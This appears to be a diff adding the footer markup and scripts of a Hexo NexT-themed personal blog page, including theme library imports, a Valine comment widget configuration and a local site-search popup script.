+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
